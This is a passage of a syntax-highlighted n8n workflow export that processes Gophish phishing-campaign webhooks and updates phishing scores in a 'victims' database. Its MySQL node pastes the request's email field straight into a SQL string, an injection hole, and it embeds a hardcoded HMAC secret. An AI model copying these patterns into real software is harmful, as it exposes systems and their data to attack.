class="string">"49aff93b-5d21-490d-a2af-95611d8f83d1"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"name"</span><span class="punctuation">:</span> <span class="string">"Extract signature"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"n8n-nodes-base.code"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"typeVersion"</span><span class="punctuation">:</span> <span class="number">2</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"position"</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="number">660</span><span class="punctuation">,</span></span><br><span class="line">        <span class="number">340</span></span><br><span class="line">      <span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">{</span></span><br><span class="line">      <span class="attr">"parameters"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">        <span class="attr">"action"</span><span class="punctuation">:</span> <span class="string">"hmac"</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"SHA256"</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">"value"</span><span class="punctuation">:</span> <span class="string">"={{ JSON.stringify($json.body) }}"</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">"dataPropertyName"</span><span class="punctuation">:</span> <span class="string">"calculated_signature"</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">"secret"</span><span class="punctuation">:</span> <span class="string">"3CWVGMndgMvdVAzOjqBiTicmv7gxc6IS"</span></span><br><span class="line">      <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"id"</span><span class="punctuation">:</span> <span class="string">"e406828a-0d97-44b8-8798-6d066c4a4159"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"name"</span><span class="punctuation">:</span> <span class="string">"Calculate the signature"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"n8n-nodes-base.crypto"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"typeVersion"</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"position"</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="number">860</span><span class="punctuation">,</span></span><br><span class="line">        <span class="number">340</span></span><br><span class="line">      <span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">{</span></span><br><span class="line">      <span class="attr">"parameters"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">        <span class="attr">"conditions"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">          <span class="attr">"options"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">            <span class="attr">"caseSensitive"</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">"leftValue"</span><span class="punctuation">:</span> <span class="string">""</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">"typeValidation"</span><span class="punctuation">:</span> <span class="string">"strict"</span></span><br><span class="line">          <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">"conditions"</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">            <span class="punctuation">{</span></span><br><span class="line">              <span class="attr">"id"</span><span class="punctuation">:</span> <span class="string">"4f69b753-a1ff-4376-88a0-032ede5d9223"</span><span class="punctuation">,</span></span><br><span class="line">              <span class="attr">"leftValue"</span><span class="punctuation">:</span> <span class="string">"={{ $json.keys() }}"</span><span class="punctuation">,</span></span><br><span class="line">              <span class="attr">"rightValue"</span><span class="punctuation">:</span> <span class="string">""</span><span class="punctuation">,</span></span><br><span class="line">              <span class="attr">"operator"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">                <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"array"</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">"operation"</span><span class="punctuation">:</span> <span class="string">"empty"</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">"singleValue"</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">              <span class="punctuation">}</span></span><br><span class="line">            <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">            <span class="punctuation">{</span></span><br><span class="line">              <span class="attr">"id"</span><span class="punctuation">:</span> <span class="string">"9605ee34-f897-48cf-93d9-756503337686"</span><span class="punctuation">,</span></span><br><span class="line">              <span class="attr">"leftValue"</span><span class="punctuation">:</span> <span class="string">""</span><span class="punctuation">,</span></span><br><span class="line">              <span class="attr">"rightValue"</span><span class="punctuation">:</span> <span class="string">""</span><span class="punctuation">,</span></span><br><span class="line">              <span class="attr">"operator"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">                <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"string"</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">"operation"</span><span class="punctuation">:</span> <span class="string">"equals"</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">"name"</span><span class="punctuation">:</span> <span class="string">"filter.operator.equals"</span></span><br><span class="line">              <span class="punctuation">}</span></span><br><span class="line">            <span class="punctuation">}</span></span><br><span class="line">          <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">"combinator"</span><span class="punctuation">:</span> <span class="string">"and"</span></span><br><span class="line">        <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">"options"</span><span class="punctuation">:</span> <span class="punctuation">{</span><span class="punctuation">}</span></span><br><span class="line">      <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"id"</span><span class="punctuation">:</span> <span class="string">"72f5d0bd-9025-4e7b-8d1f-8746035a2138"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"name"</span><span class="punctuation">:</span> <span class="string">"check if user exists in database"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"n8n-nodes-base.if"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"typeVersion"</span><span class="punctuation">:</span> <span class="number">2</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"position"</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="number">1620</span><span class="punctuation">,</span></span><br><span class="line">        <span class="number">240</span></span><br><span class="line">      <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"alwaysOutputData"</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"executeOnce"</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">    <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">{</span></span><br><span class="line">      <span class="attr">"parameters"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">        <span class="attr">"operation"</span><span class="punctuation">:</span> <span class="string">"executeQuery"</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">"query"</span><span class="punctuation">:</span> <span class="string">"SELECT * FROM victims where email = \"{{ $json.body.email }}\" LIMIT 1"</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">"options"</span><span class="punctuation">:</span> <span class="punctuation">{</span><span class="punctuation">}</span></span><br><span class="line">      <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"id"</span><span class="punctuation">:</span> <span class="string">"5929bf85-d38b-4fdd-ae76-f0a61e2cef55"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"name"</span><span class="punctuation">:</span> <span class="string">"Get current phishing score"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"n8n-nodes-base.mySql"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"typeVersion"</span><span class="punctuation">:</span> <span class="number">2.4</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"position"</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="number">1380</span><span class="punctuation">,</span></span><br><span class="line">        <span class="number">260</span></span><br><span class="line">      <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"alwaysOutputData"</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"retryOnFail"</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"executeOnce"</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"notesInFlow"</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"credentials"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">        <span class="attr">"mySql"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">          <span class="attr">"id"</span><span class="punctuation">:</span> <span class="string">"qEqs6Hx9HRmSTg5v"</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">"name"</span><span class="punctuation">:</span> <span class="string">"mariadb - phishing"</span></span><br><span class="line">        <span class="punctuation">}</span></span><br><span class="line">      <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"onError"</span><span class="punctuation">:</span> <span class="string">"continueErrorOutput"</span></span><br><span class="line">    <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">{</span></span><br><span class="line">      <span class="attr">"parameters"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">        <span class="attr">"respondWith"</span><span class="punctuation">:</span> <span class="string">"text"</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">"responseBody"</span><span class="punctuation">:</span> <span class="string">"Info: User is not in database"</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">"options"</span><span class="punctuation">:</span> <span class="punctuation">{</span><span class="punctuation">}</span></span><br><span class="line">      <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"id"</span><span class="punctuation">:</span> <span class="string">"e9806005-9ca3-4899-9b62-8d9d56ec413f"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"name"</span><span class="punctuation">:</span> <span class="string">"user not in database"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"n8n-nodes-base.respondToWebhook"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"typeVersion"</span><span class="punctuation">:</span> <span class="number">1.1</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"position"</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="number">1960</span><span class="punctuation">,</span></span><br><span class="line">        <span class="number">140</span></span><br><span class="line">      <span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">{</span></span><br><span class="line">      <span class="attr">"parameters"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">        <span class="attr">"httpMethod"</span><span class="punctuation">:</span> <span class="string">"POST"</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">"path"</span><span class="punctuation">:</span> <span class="string">"d96af3a4-21bd-4bcb-bd34-37bfc67dfd1d"</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">"responseMode"</span><span class="punctuation">:</span> <span class="string">"responseNode"</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">"options"</span><span class="punctuation">:</span> <span class="punctuation">{</span><span class="punctuation">}</span></span><br><span class="line">      <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"id"</span><span class="punctuation">:</span> <span class="string">"e425306c-06ba-441b-9860-170433602b1a"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"name"</span><span class="punctuation">:</span> <span class="string">"Webhook"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"n8n-nodes-base.webhook"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"typeVersion"</span><span class="punctuation">:</span> <span class="number">2</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"position"</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="number">220</span><span class="punctuation">,</span></span><br><span class="line">        <span class="number">440</span></span><br><span class="line">      <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"webhookId"</span><span class="punctuation">:</span> <span class="string">"d96af3a4-21bd-4bcb-bd34-37bfc67dfd1d"</span></span><br><span class="line">    <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">{</span></span><br><span class="line">      <span class="attr">"parameters"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">        <span class="attr">"errorMessage"</span><span class="punctuation">:</span> <span class="string">"User not found. This should not happen"</span></span><br><span class="line">      <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"id"</span><span class="punctuation">:</span> <span class="string">"ec2fc3c3-014f-49b7-af14-263b2d41250d"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"name"</span><span class="punctuation">:</span> <span class="string">"Stop and Error"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"n8n-nodes-base.stopAndError"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"typeVersion"</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"position"</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="number">2180</span><span class="punctuation">,</span></span><br><span class="line">        <span class="number">140</span></span><br><span class="line">      <span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">{</span></span><br><span class="line">      <span class="attr">"parameters"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">        <span class="attr">"errorMessage"</span><span class="punctuation">:</span> <span class="string">"User not found. This should not happen"</span></span><br><span class="line">      <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"id"</span><span class="punctuation">:</span> <span class="string">"f6d17a91-3305-488e-bb2a-79d10ec00c57"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"name"</span><span class="punctuation">:</span> <span class="string">"Stop"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"n8n-nodes-base.stopAndError"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"typeVersion"</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"position"</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="number">1840</span><span class="punctuation">,</span></span><br><span class="line">        <span class="number">20</span></span><br><span class="line">      <span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">}</span></span><br><span class="line">  <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">"pinData"</span><span class="punctuation">:</span> <span class="punctuation">{</span><span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">"connections"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">    <span class="attr">"If Clicked"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">      <span class="attr">"main"</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">[</span></span><br><span class="line">          <span class="punctuation">{</span></span><br><span class="line">            <span class="attr">"node"</span><span class="punctuation">:</span> <span class="string">"Update Phishing Score for Clicked Event"</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"main"</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">"index"</span><span class="punctuation">:</span> <span class="number">0</span></span><br><span class="line">          <span class="punctuation">}</span></span><br><span class="line">        <span class="punctuation">]</span></span><br><span class="line">      <span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">"If Submitted Data"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">      <span class="attr">"main"</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">[</span></span><br><span class="line">          <span class="punctuation">{</span></span><br><span class="line">            <span class="attr">"node"</span><span class="punctuation">:</span> <span class="string">"Update Phishing Score for Submitted Data"</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"main"</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">"index"</span><span class="punctuation">:</span> <span class="number">0</span></span><br><span class="line">          <span class="punctuation">}</span></span><br><span class="line">        <span class="punctuation">]</span></span><br><span class="line">      <span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">"Update Phishing Score for Clicked Event"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">      <span class="attr">"main"</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">[</span></span><br><span class="line">          <span class="punctuation">{</span></span><br><span class="line">            <span class="attr">"node"</span><span class="punctuation">:</span> <span class="string">"Success"</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"main"</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">"index"</span><span class="punctuation">:</span> <span class="number">0</span></span><br><span class="line">          <span class="punctuation">}</span></span><br><span class="line">        <span class="punctuation">]</span></span><br><span class="line">      <span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">"Update Phishing Score for Submitted Data"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">      <span class="attr">"main"</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">[</span></span><br><span class="line">          <span class="punctuation">{</span></span><br><span class="line">            <span class="attr">"node"</span><span class="punctuation">:</span> <span class="string">"Success"</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"main"</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">"index"</span><span class="punctuation">:</span> <span class="number">0</span></span><br><span class="line">          <span class="punctuation">}</span></span><br><span class="line">        <span class="punctuation">]</span></span><br><span class="line">      <span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">"Compare signature"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">      <span class="attr">"main"</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">[</span></span><br><span class="line">          <span class="punctuation">{</span></span><br><span class="line">            <span class="attr">"node"</span><span class="punctuation">:</span> <span class="string">"Get current phishing score"</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"main"</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">"index"</span><span class="punctuation">:</span> <span class="number">0</span></span><br><span class="line">          <span class="punctuation">}</span></span><br><span class="line">        <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">[</span></span><br><span class="line">          <span class="punctuation">{</span></span><br><span class="line">            <span class="attr">"node"</span><span class="punctuation">:</span> <span class="string">"invalid signature"</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"main"</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">"index"</span><span class="punctuation">:</span> <span class="number">0</span></span><br><span class="line">          <span class="punctuation">}</span></span><br><span class="line">        <span class="punctuation">]</span></span><br><span class="line">      <span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">"Check gophish header"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">      <span class="attr">"main"</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">[</span></span><br><span class="line">          <span class="punctuation">{</span></span><br><span class="line">            <span class="attr">"node"</span><span class="punctuation">:</span> <span class="string">"Extract signature"</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"main"</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">"index"</span><span class="punctuation">:</span> <span class="number">0</span></span><br><span class="line">          <span class="punctuation">}</span></span><br><span class="line">        <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">[</span></span><br><span class="line">          <span class="punctuation">{</span></span><br><span class="line">            <span class="attr">"node"</span><span class="punctuation">:</span> <span class="string">"no signature"</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"main"</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">"index"</span><span class="punctuation">:</span> <span class="number">0</span></span><br><span class="line">          <span class="punctuation">}</span></span><br><span class="line">        <span class="punctuation">]</span></span><br><span class="line">      <span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">"Extract signature"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">      <span class="attr">"main"</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">[</span></span><br><span class="line">          <span class="punctuation">{</span></span><br><span class="line">            <span class="attr">"node"</span><span class="punctuation">:</span> <span class="string">"Calculate the signature"</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"main"</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">"index"</span><span class="punctuation">:</span> <span class="number">0</span></span><br><span class="line">          <span class="punctuation">}</span></span><br><span class="line">        <span class="punctuation">]</span></span><br><span class="line">      <span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">"Calculate the signature"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">      <span class="attr">"main"</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">[</span></span><br><span class="line">          <span class="punctuation">{</span></span><br><span class="line">            <span class="attr">"node"</span><span class="punctuation">:</span> <span class="string">"Compare signature"</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"main"</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">"index"</span><span class="punctuation">:</span> <span class="number">0</span></span><br><span class="line">          <span class="punctuation">}</span></span><br><span class="line">        <span class="punctuation">]</span></span><br><span class="line">      <span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">"check if user exists in database"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">      <span class="attr">"main"</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">[</span></span><br><span class="line">          <span class="punctuation">{</span></span><br><span class="line">            <span class="attr">"node"</span><span class="punctuation">:</span> <span class="string">"user not in database"</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"main"</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">"index"</span><span class="punctuation">:</span> <span class="number">0</span></span><br><span class="line">          <span class="punctuation">}</span></span><br><span class="line">        <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">[</span></span><br><span class="line">          <span class="punctuation">{</span></span><br><span class="line">            <span class="attr">"node"</span><span class="punctuation">:</span> <span class="string">"If Clicked"</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"main"</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">"index"</span><span class="punctuation">:</span> <span class="number">0</span></span><br><span class="line">          <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">          <span class="punctuation">{</span></span><br><span class="line">            <span class="attr">"node"</span><span class="punctuation">:</span> <span class="string">"If Submitted Data"</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"main"</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">"index"</span><span class="punctuation">:</span> <span class="number">0</span></span><br><span class="line">          <span class="punctuation">}</span></span><br><span class="line">        <span class="punctuation">]</span></span><br><span class="line">      <span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">"Get current phishing score"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">      <span class="attr">"main"</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">[</span></span><br><span class="line">          <span class="punctuation">{</span></span><br><span class="line">            <span class="attr">"node"</span><span class="punctuation">:</span> <span class="string">"check if user exists in database"</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"main"</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">"index"</span><span class="punctuation">:</span> <span class="number">0</span></span><br><span class="line">          <span class="punctuation">}</span></span><br><span class="line">        <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">[</span></span><br><span class="line">          <span class="punctuation">{</span></span><br><span class="line">            <span class="attr">"node"</span><span class="punctuation">:</span> <span class="string">"DEBUG: REMOVE SOON"</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"main"</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">"index"</span><span class="punctuation">:</span> <span class="number">0</span></span><br><span class="line">          <span class="punctuation">}</span></span><br><span class="line">        <span class="punctuation">]</span></span><br><span class="line">      <span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">"Webhook"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">      <span class="attr">"main"</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">[</span></span><br><span class="line">          <span class="punctuation">{</span></span><br><span class="line">            <span class="attr">"node"</span><span class="punctuation">:</span> <span class="string">"Check gophish header"</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"main"</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">"index"</span><span class="punctuation">:</span> <span class="number">0</span></span><br><span class="line">          <span class="punctuation">}</span></span><br><span class="line">        <span class="punctuation">]</span></span><br><span class="line">      <span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">"user not in database"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">      <span class="attr">"main"</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">[</span></span><br><span class="line">          <span class="punctuation">{</span></span><br><span class="line">            <span class="attr">"node"</span><span class="punctuation">:</span> <span class="string">"Stop and Error"</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"main"</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">"index"</span><span class="punctuation">:</span> <span class="number">0</span></span><br><span class="line">          <span class="punctuation">}</span></span><br><span class="line">        <span class="punctuation">]</span></span><br><span class="line">      <span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">"DEBUG: REMOVE SOON"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">      <span class="attr">"main"</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">[</span></span><br><span class="line">          <span class="punctuation">{</span></span><br><span class="line">            <span class="attr">"node"</span><span class="punctuation">:</span> <span class="string">"Stop"</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"main"</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">"index"</span><span class="punctuation">:</span> <span class="number">0</span></span><br><span class="line">          <span class="punctuation">}</span></span><br><span class="line">        <span class="punctuation">]</span></span><br><span class="line">      <span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">}</span></span><br><span class="line">  <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">"active"</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">"settings"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">    <span class="attr">"executionOrder"</span><span class="punctuation">:</span> <span class="string">"v1"</span></span><br><span class="line">  <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">  